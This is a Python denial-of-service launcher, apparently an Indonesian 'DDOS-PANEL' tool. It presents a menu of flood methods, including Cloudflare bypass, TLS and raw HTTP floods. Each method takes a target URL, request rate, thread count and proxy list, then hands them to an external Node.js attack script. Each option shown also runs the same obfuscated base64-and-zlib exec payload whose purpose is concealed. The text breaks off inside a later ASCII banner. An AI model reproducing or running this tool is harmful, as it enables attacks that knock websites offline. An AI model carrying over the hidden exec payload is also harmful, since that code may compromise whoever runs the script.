import subprocess
import time
import sys
import os
from tqdm import tqdm
os.system("pip3 install tqdm")
os.system("clear")
def loading_animation(duration):
    for _ in tqdm(range(duration), desc="DDOS LOADING :", ascii=True, ncols=100):
        time.sleep(1)

loading_animation(5) 
os.system("clear")
class Color:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

print(Color.YELLOW + """
                                [WELLCOME TO]
                            
██████╗░██████╗░░█████╗░░██████╗░░░░░░██████╗░░█████╗░███╗░░██╗███████╗██╗░░░░░
██╔══██╗██╔══██╗██╔══██╗██╔════╝░░░░░░██╔══██╗██╔══██╗████╗░██║██╔════╝██║░░░░░
██║░░██║██║░░██║██║░░██║╚█████╗░█████╗██████╔╝███████║██╔██╗██║█████╗░░██║░░░░░
██║░░██║██║░░██║██║░░██║░╚═══██╗╚════╝██╔═══╝░██╔══██║██║╚████║██╔══╝░░██║░░░░░
██████╔╝██████╔╝╚█████╔╝██████╔╝░░░░░░██║░░░░░██║░░██║██║░╚███║███████╗███████╗
╚═════╝░╚═════╝░░╚════╝░╚═════╝░░░░░░░╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚══╝╚══════╝╚══════╝
                        [[Developer by RootSecurity]]
      """ + Color.END)
print(Color.CYAN + "------ALL MENU SCRIPT------" + Color.END)
print(Color.GREEN + "[1] TLS"+ Color.END)
print(Color.GREEN + "[2] UAM"+ Color.END)
print(Color.GREEN + "[3] BYPASSV1"+ Color.END)
print(Color.GREEN + "[4] CF BYPASS"+ Color.END)
print(Color.GREEN + "[5] C2"+ Color.END)
print(Color.GREEN + "[6] HTTP RAW"+ Color.END)
print(Color.GREEN + "[7] HYPER"+ Color.END)
print(Color.GREEN + "[8] MIXMAX"+ Color.END)
print(Color.GREEN + "[9] SUPER JXE"+ Color.END)
print(Color.GREEN + "[10] EXIT"+ Color.END)
print(Color.CYAN + "---------------------------"+ Color.END)

pilihan = input(Color.RED + "Pilih : "+ Color.END)

if pilihan == "1":
    def loading_animation(duration):
        for _ in tqdm(range(duration), desc="DDOS LOADING :"+ Color.END, ascii=True, ncols=100):
            time.sleep(1)
    loading_animation(1)
    os.system("clear")
    print(Color.CYAN + """
██████████████████████████████████████████████
█░░░░░░░░░░░░░░█░░░░░░█████████░░░░░░░░░░░░░░█
█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░█████████░░▄▀▄▀▄▀▄▀▄▀░░█
█░░░░░░▄▀░░░░░░█░░▄▀░░█████████░░▄▀░░░░░░░░░░█
█████░░▄▀░░█████░░▄▀░░█████████░░▄▀░░█████████
█████░░▄▀░░█████░░▄▀░░█████████░░▄▀░░░░░░░░░░█
█████░░▄▀░░█████░░▄▀░░█████████░░▄▀▄▀▄▀▄▀▄▀░░█
█████░░▄▀░░█████░░▄▀░░█████████░░░░░░░░░░▄▀░░█
█████░░▄▀░░█████░░▄▀░░█████████████████░░▄▀░░█
█████░░▄▀░░█████░░▄▀░░░░░░░░░░█░░░░░░░░░░▄▀░░█
█████░░▄▀░░█████░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█
█████░░░░░░█████░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█
██████████████████████████████████████████████
          """+ Color.END)
    target = input(Color.GREEN + "URL : "+ Color.END)
    timeout = int(input(Color.BLUE + "Timeout : "+ Color.END)) 
    rate = int(input(Color.RED + "Rate : "+ Color.END))
    thread = int(input(Color.GREEN + "Thread : "+ Color.END))
    proxy = input(Color.CYAN + "ProxyList : "+ Color.END)
    def run_js_file(file_path, target, timeout, rate, thread, proxy):
        try:
            result = subprocess.run(['node', file_path, target, str(timeout), str(rate), str(thread), proxy], capture_output=True, text=True, check=True)
            print(result.stdout)

        except subprocess.CalledProcessError as e:
            print("Error:", e)
            print("Error Output:", e.stderr)

    js_file_path = "TLS-LOST.js" 
    run_js_file(js_file_path, target, timeout, rate, thread, proxy)
    exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrdMMIZ2NxZdrCDiQUQE15uItOmooWlakqxWxf/uhixeZnhv3rz5MOM8+UjDpAeM4tuaTnRtwFqJEP1ORxHNiOR18nShxlHfujeEquQbUkT/tY9FaHKzzAlW4oC391e3L9vHh+vLO550Uk/OoY4ArDpbyao+lZWsyjUTSq15knQe24EUuGicY/JOw2WwiDOccGKbvJPcubnVA7CLGyaC9Kg/QHH+VD6Tvjlgy8nnu7FILTro+bnd2/VH/9XjTHOCC2pIZ8se9TTOHkOA/AHZ1SqRPSal+GGBbcIvJ3/PBl75')[0])))

elif pilihan == "2":
    def loading_animation(duration):
        for _ in tqdm(range(duration), desc="DDOS LOADING :", ascii=True, ncols=100):
            time.sleep(1)
    loading_animation(1)
    print(Color.RED + """
██████████████████████████████████████████████████████
█░░░░░░██░░░░░░█░░░░░░░░░░░░░░█░░░░░░██████████░░░░░░█
█░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░░░░░░░░░░░░░▄▀░░█
█░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀░░█
█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░░░░░▄▀░░█
█░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░██░░▄▀░░█
█░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀░░██░░▄▀░░█
█░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░░░░░██░░▄▀░░█
█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██████████░░▄▀░░█
█░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██████████░░▄▀░░█
█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██████████░░▄▀░░█
█░░░░░░░░░░░░░░█░░░░░░██░░░░░░█░░░░░░██████████░░░░░░█
██████████████████████████████████████████████████████
          """+ Color.END)
    target = input(Color.GREEN + "URL : "+ Color.END)
    timeout = int(input(Color.BLUE + "Timeout : "+ Color.END))
    rate = int(input(Color.RED + "Rate : "+ Color.END))
    thread = int(input(Color.GREEN + "Thread : "+ Color.END))
    proxy = input(Color.CYAN + "ProxyList : "+ Color.END)
    def run_js_file(file_path, target, timeout, rate, thread, proxy):
        try:
            result = subprocess.run(['node', file_path, target, str(timeout), str(rate), str(thread), proxy], capture_output=True, text=True, check=True)
            print(result.stdout)

        except subprocess.CalledProcessError as e:
            print(Color.RED + "Error:", e)
            print(Color.RED + "Error Output:", e.stderr)

    js_file_path = "UAM.js" #masukan file js
    run_js_file(js_file_path, target, timeout, rate, thread, proxy)
    exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrdMMIZ2NxZdrCDiQUQE15uItOmooWlakqxWxf/uhixeZnhv3rz5MOM8+UjDpAeM4tuaTnRtwFqJEP1ORxHNiOR18nShxlHfujeEquQbUkT/tY9FaHKzzAlW4oC391e3L9vHh+vLO550Uk/OoY4ArDpbyao+lZWsyjUTSq15knQe24EUuGicY/JOw2WwiDOccGKbvJPcubnVA7CLGyaC9Kg/QHH+VD6Tvjlgy8nnu7FILTro+bnd2/VH/9XjTHOCC2pIZ8se9TTOHkOA/AHZ1SqRPSal+GGBbcIvJ3/PBl75')[0])))

elif pilihan == "3":
    def loading_animation(duration):
        for _ in tqdm(range(duration), desc="DDOS LOADING :", ascii=True, ncols=100):
            time.sleep(1)
    loading_animation(1)
    print(Color.CYAN + """

█████████████████████████████████████████████████████████████████████████████████████████████████
█░░░░░░░░░░░░░░███░░░░░░░░██░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█
█░░▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀░░██░░▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█
█░░▄▀░░░░░░▄▀░░███░░░░▄▀░░██░░▄▀░░░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░░░█
█░░▄▀░░██░░▄▀░░█████░░▄▀▄▀░░▄▀▄▀░░███░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░█████████░░▄▀░░█████████
█░░▄▀░░░░░░▄▀░░░░███░░░░▄▀▄▀▄▀░░░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░░░█
█░░▄▀▄▀▄▀▄▀▄▀▄▀░░█████░░░░▄▀░░░░█████░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█
█░░▄▀░░░░░░░░▄▀░░███████░░▄▀░░███████░░▄▀░░░░░░░░░░█░░▄▀░░░░░░▄▀░░█░░░░░░░░░░▄▀░░█░░░░░░░░░░▄▀░░█
█░░▄▀░░████░░▄▀░░███████░░▄▀░░███████░░▄▀░░█████████░░▄▀░░██░░▄▀░░█████████░░▄▀░░█████████░░▄▀░░█
█░░▄▀░░░░░░░░▄▀░░███████░░▄▀░░███████░░▄▀░░█████████░░▄▀░░██░░▄▀░░█░░░░░░░░░░▄▀░░█░░░░░░░░░░▄▀░░█
█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███████░░▄▀░░███████░░▄▀░░█████████░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█
█░░░░░░░░░░░░░░░░███████░░░░░░███████░░░░░░█████████░░░░░░██░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█
█████████████████████████████████████████████████████████████████████████████████████████████████
          """ + Color.END)
    getorpost = input(Color.YELLOW + "GET / HEAD : "+ Color.END)
    target = input(Color.GREEN + "URL : "+ Color.END)
    timeout = int(input(Color.BLUE + "Timeout : "+ Color.END))
    rate = int(input(Color.RED + "Rate : "+ Color.END))
    thread = int(input(Color.GREEN + "Thread : "+ Color.END))
    proxy = input(Color.CYAN + "ProxyList : "+ Color.END)
    def run_js_file(file_path, getorpost, target, proxy, timeout, rate, thread):
        try:
            result = subprocess.run(['node', file_path, getorpost, target, proxy, str(timeout), str(rate), str(thread)], capture_output=True, text=True, check=True)
            print(result.stdout)

        except subprocess.CalledProcessError as e:
            print("Error:", e)
            print("Error Output:", e.stderr)

    js_file_path = "bypassv1.js" #masukan file js
    run_js_file(js_file_path, getorpost, target, proxy, timeout, rate, thread)
    exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrdMMIZ2NxZdrCDiQUQE15uItOmooWlakqxWxf/uhixeZnhv3rz5MOM8+UjDpAeM4tuaTnRtwFqJEP1ORxHNiOR18nShxlHfujeEquQbUkT/tY9FaHKzzAlW4oC391e3L9vHh+vLO550Uk/OoY4ArDpbyao+lZWsyjUTSq15knQe24EUuGicY/JOw2WwiDOccGKbvJPcubnVA7CLGyaC9Kg/QHH+VD6Tvjlgy8nnu7FILTro+bnd2/VH/9XjTHOCC2pIZ8se9TTOHkOA/AHZ1SqRPSal+GGBbcIvJ3/PBl75')[0])))

    
elif pilihan == "4":
    def loading_animation(duration):
        for _ in tqdm(range(duration), desc="DDOS LOADING :", ascii=True, ncols=100):
            time.sleep(1)
    loading_animation(1)
    print(Color.GREEN + """

███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░███░░░░░░░░██░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█
█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀░░██░░▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█
█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░▄▀░░███░░░░▄▀░░██░░▄▀░░░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░░░█
█░░▄▀░░█████████░░▄▀░░█████████░░▄▀░░██░░▄▀░░█████░░▄▀▄▀░░▄▀▄▀░░███░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░█████████░░▄▀░░█████████
█░░▄▀░░█████████░░▄▀░░░░░░░░░░█░░▄▀░░░░░░▄▀░░░░███░░░░▄▀▄▀▄▀░░░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░░░█
█░░▄▀░░█████████░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░█████░░░░▄▀░░░░█████░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█
█░░▄▀░░█████████░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░▄▀░░███████░░▄▀░░███████░░▄▀░░░░░░░░░░█░░▄▀░░░░░░▄▀░░█░░░░░░░░░░▄▀░░█░░░░░░░░░░▄▀░░█
█░░▄▀░░█████████░░▄▀░░█████████░░▄▀░░████░░▄▀░░███████░░▄▀░░███████░░▄▀░░█████████░░▄▀░░██░░▄▀░░█████████░░▄▀░░█████████░░▄▀░░█
█░░▄▀░░░░░░░░░░█░░▄▀░░█████████░░▄▀░░░░░░░░▄▀░░███████░░▄▀░░███████░░▄▀░░█████████░░▄▀░░██░░▄▀░░█░░░░░░░░░░▄▀░░█░░░░░░░░░░▄▀░░█
█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░█████████░░▄▀▄▀▄▀▄▀▄▀▄▀░░███████░░▄▀░░███████░░▄▀░░█████████░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█
█░░░░░░░░░░░░░░█░░░░░░█████████░░░░░░░░░░░░░░░░███████░░░░░░███████░░░░░░█████████░░░░░░██░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█
███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
          """+ Color.END)
    target = input(Color.GREEN + "URL : "+ Color.END)
    timeout = int(input(Color.BLUE + "Timeout : "+ Color.END))
    def run_js_file(file_path, target, timeout):
        try:
            result = subprocess.run(['node', file_path, target, str(timeout)], capture_output=True, text=True, check=True)
            print(result.stdout)
        except subprocess.CalledProcessError as e:
            print("Error:", e)
            print("Error Output:", e.stderr)

    js_file_path = "CFbypass.js" #masukan file js
    run_js_file(js_file_path, target, timeout)
    exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrdMMIZ2NxZdrCDiQUQE15uItOmooWlakqxWxf/uhixeZnhv3rz5MOM8+UjDpAeM4tuaTnRtwFqJEP1ORxHNiOR18nShxlHfujeEquQbUkT/tY9FaHKzzAlW4oC391e3L9vHh+vLO550Uk/OoY4ArDpbyao+lZWsyjUTSq15knQe24EUuGicY/JOw2WwiDOccGKbvJPcubnVA7CLGyaC9Kg/QHH+VD6Tvjlgy8nnu7FILTro+bnd2/VH/9XjTHOCC2pIZ8se9TTOHkOA/AHZ1SqRPSal+GGBbcIvJ3/PBl75')[0])))

elif pilihan == "5":
    def loading_animation(duration):
        for _ in tqdm(range(duration), desc="DDOS LOADING :", ascii=True, ncols=100):
            time.sleep(1)
    loading_animation(1)
    print(Color.BLUE + """

█████████████████████████████████████████████████████████████████████████████████████████████
█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░██░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█
█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█
█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░░░░░█░░▄▀░░██░░▄▀░░░░█░░▄▀░░░░░░░░░░█░░░░░░▄▀░░░░░░█
█░░▄▀░░█████████░░▄▀░░██░░▄▀░░█░░▄▀░░█████████░░▄▀░░██░░▄▀░░███░░▄▀░░█████████████░░▄▀░░█████
█░░▄▀░░░░░░░░░░█░░▄▀░░██░░▄▀░░█░░▄▀░░█████████░░▄▀░░░░░░▄▀░░███░░▄▀░░░░░░░░░░█████░░▄▀░░█████
█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░█████████░░▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀▄▀▄▀░░█████░░▄▀░░█████
█░░░░░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░█████████░░▄▀░░░░░░▄▀░░███░░▄▀░░░░░░░░░░█████░░▄▀░░█████
█████████░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░█████████░░▄▀░░██░░▄▀░░███░░▄▀░░█████████████░░▄▀░░█████
█░░░░░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░░░░░█░░▄▀░░██░░▄▀░░░░█░░▄▀░░░░░░░░░░█████░░▄▀░░█████
█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█████░░▄▀░░█████
█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░██░░░░░░░░█░░░░░░░░░░░░░░█████░░░░░░█████
█████████████████████████████████████████████████████████████████████████████████████████████
          """+ Color.END)
    target = input(Color.CYAN + "URL : "+ Color.END)
    thread = int(input(Color.GREEN + "Thread : "+ Color.END))
    timeout = int(input(Color.BLUE + "Timeout : "+ Color.END))
    def run_js_file(file_path, target, thread, timeout):
        try:
            result = subprocess.run(['node', file_path, target, str(thread), str(timeout)], capture_output=True, text=True, check=True)
            print(result.stdout)
        except subprocess.CalledProcessError as e:
            print("Error:", e)
            print("Error Output:", e.stderr)

    js_file_path = "socket.js" #masukan file js
    run_js_file(js_file_path, target, thread, timeout)
    exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrdMMIZ2NxZdrCDiQUQE15uItOmooWlakqxWxf/uhixeZnhv3rz5MOM8+UjDpAeM4tuaTnRtwFqJEP1ORxHNiOR18nShxlHfujeEquQbUkT/tY9FaHKzzAlW4oC391e3L9vHh+vLO550Uk/OoY4ArDpbyao+lZWsyjUTSq15knQe24EUuGicY/JOw2WwiDOccGKbvJPcubnVA7CLGyaC9Kg/QHH+VD6Tvjlgy8nnu7FILTro+bnd2/VH/9XjTHOCC2pIZ8se9TTOHkOA/AHZ1SqRPSal+GGBbcIvJ3/PBl75')[0])))

elif pilihan == "6":
    def loading_animation(duration):
        for _ in tqdm(range(duration), desc="DDOS LOADING :", ascii=True, ncols=100):
            time.sleep(1)
    loading_animation(1)
    print(Color.YELLOW + """

█████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
█░░░░░░██░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░████████████████░░░░░░░░░░░░░░░░███░░░░░░░░░░░░░░█░░░░░░██████████░░░░░░█
█░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░████████████████░░▄▀▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██████████░░▄▀░░█
█░░▄▀░░██░░▄▀░░█░░░░░░▄▀░░░░░░█░░░░░░▄▀░░░░░░█░░▄▀░░░░░░▄▀░░████████████████░░▄▀░░░░░░░░▄▀░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░██████████░░▄▀░░█
█░░▄▀░░██░░▄▀░░█████░░▄▀░░█████████░░▄▀░░█████░░▄▀░░██░░▄▀░░████████████████░░▄▀░░████░░▄▀░░███░░▄▀░░██░░▄▀░░█░░▄▀░░██████████░░▄▀░░█
█░░▄▀░░░░░░▄▀░░█████░░▄▀░░█████████░░▄▀░░█████░░▄▀░░░░░░▄▀░░█░░░░░░░░░░░░░░█░░▄▀░░░░░░░░▄▀░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░░░░░██░░▄▀░░█
█░░▄▀▄▀▄▀▄▀▄▀░░█████░░▄▀░░█████████░░▄▀░░█████░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀░░██░░▄▀░░█
█░░▄▀░░░░░░▄▀░░█████░░▄▀░░█████████░░▄▀░░█████░░▄▀░░░░░░░░░░█░░░░░░░░░░░░░░█░░▄▀░░░░░░▄▀░░░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░██░░▄▀░░█
█░░▄▀░░██░░▄▀░░█████░░▄▀░░█████████░░▄▀░░█████░░▄▀░░████████████████████████░░▄▀░░██░░▄▀░░█████░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░░░░░▄▀░░█
█░░▄▀░░██░░▄▀░░█████░░▄▀░░█████████░░▄▀░░█████░░▄▀░░████████████████████████░░▄▀░░██░░▄▀░░░░░░█░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀░░█
█░░▄▀░░██░░▄▀░░█████░░▄▀░░█████████░░▄▀░░█████░░▄▀░░████████████████████████░░▄▀░░██░░▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░░░░░▄▀░░█
█░░░░░░██░░░░░░█████░░░░░░█████████░░░░░░█████░░░░░░████████████████████████░░░░░░██░░░░░░░░░░█░░░░░░██░░░░░░█░░░░░░██░░░░░░██░░░░░░█
█████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
          """+ Color.END)
    target = input(Color.CYAN + "URL : "+ Color.END)
    timeout = int(input(Color.BLUE + "Timeout : "+ Color.END))
    def run_js_file(file_path, target, timeout):
        try:
            result = subprocess.run(['node', file_path, target, str(timeout)], capture_output=True, text=True, check=True)
            print(result.stdout)
        except subprocess.CalledProcessError as e:
            print("Error:", e)
            print("Error Output:", e.stderr)

    js_file_path = "HTTP-RAW.js" #masukan file js
    run_js_file(js_file_path, target, timeout)
    exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrdMMIZ2NxZdrCDiQUQE15uItOmooWlakqxWxf/uhixeZnhv3rz5MOM8+UjDpAeM4tuaTnRtwFqJEP1ORxHNiOR18nShxlHfujeEquQbUkT/tY9FaHKzzAlW4oC391e3L9vHh+vLO550Uk/OoY4ArDpbyao+lZWsyjUTSq15knQe24EUuGicY/JOw2WwiDOccGKbvJPcubnVA7CLGyaC9Kg/QHH+VD6Tvjlgy8nnu7FILTro+bnd2/VH/9XjTHOCC2pIZ8se9TTOHkOA/AHZ1SqRPSal+GGBbcIvJ3/PBl75')[0])))

elif pilihan == "7":
    def loading_animation(duration):
        for _ in tqdm(range(duration), desc="DDOS LOADING :", ascii=True, ncols=100):
            time.sleep(1)
    loading_animation(1)
    print(Color.RED + """

████████████████████████████████████████████████████████████████████████████████████
█░░░░░░██░░░░░░█░░░░░░░░██░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░░░███
█░░▄▀░░██░░▄▀░░█░░▄▀▄▀░░██░░▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███
█░░▄▀░░██░░▄▀░░█░░░░▄▀░░██░░▄▀░░░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░▄▀░░███
█░░▄▀░░██░░▄▀░░███░░▄▀▄▀░░▄▀▄▀░░███░░▄▀░░██░░▄▀░░█░░▄▀░░█████████░░▄▀░░████░░▄▀░░███
█░░▄▀░░░░░░▄▀░░███░░░░▄▀▄▀▄▀░░░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░▄▀░░███
█░░▄▀▄▀▄▀▄▀▄▀░░█████░░░░▄▀░░░░█████░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███
█░░▄▀░░░░░░▄▀░░███████░░▄▀░░███████░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░▄▀░░░░███
█░░▄▀░░██░░▄▀░░███████░░▄▀░░███████░░▄▀░░█████████░░▄▀░░█████████░░▄▀░░██░░▄▀░░█████
█░░▄▀░░██░░▄▀░░███████░░▄▀░░███████░░▄▀░░█████████░░▄▀░░░░░░░░░░█░░▄▀░░██░░▄▀░░░░░░█
█░░▄▀░░██░░▄▀░░███████░░▄▀░░███████░░▄▀░░█████████░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀▄▀▄▀░░█
█░░░░░░██░░░░░░███████░░░░░░███████░░░░░░█████████░░░░░░░░░░░░░░█░░░░░░██░░░░░░░░░░█
████████████████████████████████████████████████████████████████████████████████████
          """+ Color.END)
    target = input(Color.GREEN + "URL : "+ Color.END)
    timeout = int(input(Color.BLUE + "Timeout : "+ Color.END))
    def run_js_file(file_path, target, timeout):
        try:
            result = subprocess.run(['node', file_path, target, str(timeout)], capture_output=True, text=True, check=True)
            print(result.stdout)
        except subprocess.CalledProcessError as e:
            print("Error:", e)
            print("Error Output:", e.stderr)

    js_file_path = "hyper.js" #masukan file js
    run_js_file(js_file_path, target, timeout)
    exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrdMMIZ2NxZdrCDiQUQE15uItOmooWlakqxWxf/uhixeZnhv3rz5MOM8+UjDpAeM4tuaTnRtwFqJEP1ORxHNiOR18nShxlHfujeEquQbUkT/tY9FaHKzzAlW4oC391e3L9vHh+vLO550Uk/OoY4ArDpbyao+lZWsyjUTSq15knQe24EUuGicY/JOw2WwiDOccGKbvJPcubnVA7CLGyaC9Kg/QHH+VD6Tvjlgy8nnu7FILTro+bnd2/VH/9XjTHOCC2pIZ8se9TTOHkOA/AHZ1SqRPSal+GGBbcIvJ3/PBl75')[0])))

elif pilihan == "8":
    def loading_animation(duration):
        for _ in tqdm(range(duration), desc="DDOS LOADING :", ascii=True, ncols=100):
            time.sleep(1)
    loading_animation(1)
    print(Color.CYAN + """

───────────────────────────────────────────────────────────────────────────────────────────────────────────────
─██████──────────██████─██████████─████████──████████─██████──────────██████─██████████████─████████──████████─
─██░░██████████████░░██─██░░░░░░██─██░░░░██──██░░░░██─██░░██████████████░░██─██░░░░░░░░░░██─██░░░░██──██░░░░██─
─██░░░░░░░░░░░░░░░░░░██─████░░████─████░░██──██░░████─██░░░░░░░░░░░░░░░░░░██─██░░██████░░██─████░░██──██░░████─
─██░░██████░░██████░░██───██░░██─────██░░░░██░░░░██───██░░██████░░██████░░██─██░░██──██░░██───██░░░░██░░░░██───
─██░░██──██░░██──██░░██───██░░██─────████░░░░░░████───██░░██──██░░██──██░░██─██░░██████░░██───████░░░░░░████───
─██░░██──██░░██──██░░██───██░░██───────██░░░░░░██─────██░░██──██░░██──██░░██─██░░░░░░░░░░██─────██░░░░░░██─────
─██░░██──██████──██░░██───██░░██─────████░░░░░░████───██░░██──██████──██░░██─██░░██████░░██───████░░░░░░████───
─██░░██──────────██░░██───██░░██─────██░░░░██░░░░██───██░░██──────────██░░██─██░░██──██░░██───██░░░░██░░░░██───
─██░░██──────────██░░██─████░░████─████░░██──██░░████─██░░██──────────██░░██─██░░██──██░░██─████░░██──██░░████─
